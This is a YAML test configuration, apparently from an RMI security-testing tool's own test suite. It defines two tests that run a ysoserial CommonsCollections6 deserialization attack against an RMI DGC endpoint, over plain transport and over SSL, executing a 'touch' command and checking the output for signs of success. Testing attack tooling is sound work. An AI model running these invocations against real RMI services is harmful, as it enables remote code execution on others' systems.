tester:
  title: DGC Tests
  description: |-
    'Performs tests for the serial action on an RMI DGC endpoint.'

  id: '001-005'
  groups:
    - dgc
    - serial
  id_pattern: '001-005-{:03}'


variables:
  file: dgc-rce-test.txt


tests:
  - title: Gadget Call
    description: |-
      'Attempts a deserialization attack on the DGC endpoint.'
      'The deserialization should work, but the chain is broken at some point.'

    groups:
      - ysoserial

    command: '${BASE-CMD}'
    arguments:
      - serial
      - CommonsCollections6
      - 'touch ${volume-d}/${file}'
      - --component
      - dgc
    validators:
      - error: False
      - contains:
          values:
            - Caught java.security.AccessControlException during deserialization attack
            - This could be caused by your gadget an the attack probably worked anyway
      #- file_exists:
      #    cleanup: True
      #    files:
      #      - '${volume}/${file}'


  - title: Gadget Call (SSL)
    description: |-
      'Attempts a deserialization attack on the DGC endpoint.'
      'The deserialization should work, but the chain is broken at some point.'

    groups:
      - ysoserial

    command: '${BASE-CMD-SSL}'
    arguments:
      - serial
      - CommonsCollections6
      - 'touch ${volume-d}/${file}'
      - --component
      - dgc
    validators:
      - error: False
      - contains:
          values:
            - Caught java.lang.NoClassDefFoundError during deserialization attack
            - This could be caused by your gadget an the attack probably worked anyway
